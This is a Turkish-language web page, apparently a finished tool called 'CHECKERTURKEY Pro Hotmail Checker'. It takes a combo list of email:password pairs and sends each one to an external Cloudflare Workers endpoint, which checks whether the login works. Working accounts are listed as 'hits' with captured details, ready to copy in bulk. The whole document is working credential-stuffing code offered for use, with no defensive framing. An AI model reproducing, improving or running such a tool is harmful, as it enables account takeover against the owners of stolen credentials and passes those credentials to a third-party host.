<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHECKERTURKEY | Pro Hotmail Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #050505; color: #ececec; font-family: 'Inter', sans-serif; }
        .glass { background: rgba(15, 15, 15, 0.95); border: 1px solid rgba(255, 0, 0, 0.1); }
        .console-box { background: #000; font-family: 'Fira Code', monospace; height: 250px; overflow-y: auto; border: 1px solid #222; }
        .hits-box { background: #080808; height: 350px; overflow-y: auto; border: 1px solid #1a3a1a; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #ff0000; }
    </style>
</head>
<body class="pb-10">
    <nav class="p-6 border-b border-white/5 text-center bg-black/50 sticky top-0 z-50 backdrop-blur">
        <h1 class="text-2xl font-black tracking-tighter">CHECKER<span class="text-red-600 font-bold">TURKEY</span></h1>
    </nav>

    <main class="max-w-6xl mx-auto p-4 mt-6 grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        <!-- Sol Panel: Giriş ve Kontroller -->
        <div class="lg:col-span-2 space-y-6">
            <div class="glass p-6 rounded-3xl shadow-2xl">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="text-sm font-bold uppercase tracking-widest text-red-600">Combo List</h2>
                    <span id="totalLines" class="text-[10px] bg-white/5 px-2 py-1 rounded text-gray-400">0 lines</span>
                </div>
                
                <textarea id="comboList" class="w-full h-40 bg-black border border-white/10 rounded-2xl p-4 text-sm font-mono focus:outline-none focus:border-red-600 mb-4 transition-all" placeholder="mail:pass"></textarea>
                
                <div class="flex gap-3 mb-6">
                    <button onclick="document.getElementById('fileInp').click()" class="bg-zinc-900 p-4 rounded-2xl hover:bg-zinc-800 transition-all">
                        <i class="fa-solid fa-file-import"></i>
                    </button>
                    <input type="file" id="fileInp" class="hidden">
                    <button id="startBtn" class="flex-1 bg-red-600 rounded-2xl font-bold uppercase tracking-widest hover:bg-red-700 transition-all shadow-lg shadow-red-600/20">BAŞLAT</button>
                    <button id="stopBtn" class="bg-zinc-800 px-6 rounded-2xl font-bold">DURDUR</button>
                </div>

                <div class="grid grid-cols-3 gap-3 text-center">
                    <div class="bg-black/50 border border-green-900/20 p-4 rounded-2xl"><p class="text-[10px] text-gray-500 uppercase">Hit</p><p id="hitCnt" class="text-2xl font-bold text-green-500">0</p></div>
                    <div class="bg-black/50 border border-red-900/20 p-4 rounded-2xl"><p class="text-[10px] text-gray-500 uppercase">Bad</p><p id="badCnt" class="text-2xl font-bold text-red-500">0</p></div>
                    <div class="bg-black/50 border border-blue-900/20 p-4 rounded-2xl"><p class="text-[10px] text-gray-500 uppercase">Checked</p><p id="totalCnt" class="text-2xl font-bold text-blue-500">0</p></div>
                </div>
            </div>

            <!-- Konsol -->
            <div class="glass rounded-3xl overflow-hidden">
                <div class="bg-white/5 px-4 py-2 border-b border-white/5 flex justify-between items-center">
                    <span class="text-[10px] uppercase font-bold text-gray-500">Live Activity</span>
                    <button onclick="document.getElementById('console').innerHTML = ''" class="text-[10px] text-red-600">Temizle</button>
                </div>
                <div id="console" class="console-box p-4 text-[11px] leading-relaxed"></div>
            </div>
        </div>

        <!-- Sağ Panel: HITS -->
        <div class="space-y-6">
            <div class="glass p-6 rounded-3xl h-full flex flex-col">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="text-sm font-bold uppercase tracking-widest text-green-500">Hit Accounts</h2>
                    <button id="copyBtn" class="text-[10px] bg-green-600/20 text-green-500 px-2 py-1 rounded hover:bg-green-600 hover:text-white transition-all">Tümünü Kopyala</button>
                </div>
                <div id="hitsList" class="hits-box rounded-2xl p-3 space-y-3">
                    <p class="text-gray-700 text-[10px] text-center mt-10 italic italic">Henüz hit yok...</p>
                </div>
            </div>
        </div>

    </main>

    <script>
        let isRunning = false;
        const WORKER_URL = "https://curly-field-bfa5.hesapcomtr295.workers.dev/"; 
        const hitsArray = [];

        document.getElementById('fileInp').addEventListener('change', function(e) {
            const reader = new FileReader();
            reader.onload = () => {
                document.getElementById('comboList').value = reader.result;
                const lines = reader.result.split('\n').filter(x => x.includes(':')).length;
                document.getElementById('totalLines').innerText = lines + " lines";
            };
            reader.readAsText(e.target.files[0]);
        });

        document.getElementById('startBtn').addEventListener('click', async () => {
            const combos = document.getElementById('comboList').value.split('\n').filter(x => x.includes(':'));
            if(combos.length === 0) return alert("Liste boş!");
            
            isRunning = true;
            document.getElementById('startBtn').disabled = true;
            document.getElementById('startBtn').innerText = "ÇALIŞIYOR...";

            for(let combo of combos) {
                if(!isRunning) break;
                const [email, pass] = combo.trim().split(':');
                updateLog(`Checking: ${email}`, 'gray');

                try {
                    const res = await fetch(WORKER_URL, {
                        method: 'POST',
                        body: JSON.stringify({ email, pass })
                    });
                    const data = await res.json();

                    if(data.status === "HIT") {
                        addHit(email, pass, data.capture);
                        updateLog(`HIT! ${email}`, 'green');
                        document.getElementById('hitCnt').innerText = parseInt(document.getElementById('hitCnt').innerText) + 1;
                    } else {
                        updateLog(`BAD: ${email}`, 'red');
                        document.getElementById('badCnt').innerText = parseInt(document.getElementById('badCnt').innerText) + 1;
                    }
                } catch(e) {
                    updateLog(`ERR: Connection failed!`, 'red');
                }
                document.getElementById('totalCnt').innerText = parseInt(document.getElementById('totalCnt').innerText) + 1;
            }
            isRunning = false;
            document.getElementById('startBtn').disabled = false;
            document.getElementById('startBtn').innerText = "BAŞLAT";
        });

        document.getElementById('stopBtn').addEventListener('click', () => isRunning = false);

        function updateLog(msg, color) {
            const p = document.createElement('p');
            p.className = color === 'green' ? "text-green-500 font-bold" : (color === 'red' ? "text-red-500/50" : "text-gray-600");
            p.innerHTML = `<span class="opacity-30 text-[9px] mr-1">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
            const console = document.getElementById('console');
            console.prepend(p);
        }

        function addHit(email, pass, capture) {
            const hitsList = document.getElementById('hitsList');
            if(hitsArray.length === 0) hitsList.innerHTML = '';
            
            hitsArray.push(`${email}:${pass} | ${capture}`);
            
            const div = document.createElement('div');
            div.className = "bg-white/5 border-l-2 border-green-500 p-3 rounded-r-xl text-[11px] animate-pulse-once";
            div.innerHTML = `
                <div class="font-bold text-green-400">${email}:${pass}</div>
                <div class="text-[9px] text-gray-500 mt-1 uppercase tracking-tighter"><i class="fa-solid fa-tags mr-1"></i>${capture}</div>
            `;
            hitsList.prepend(div);
        }

        document.getElementById('copyBtn').addEventListener('click', () => {
            if(hitsArray.length === 0) return;
            const text = hitsArray.join('\n');
            const el = document.createElement('textarea');
            el.value = text;
            document.body.appendChild(el);
            el.select();
            document.execCommand('copy');
            document.body.removeChild(el);
            alert("Tüm hitler kopyalandı!");
        });
    </script>
</body>
</html>
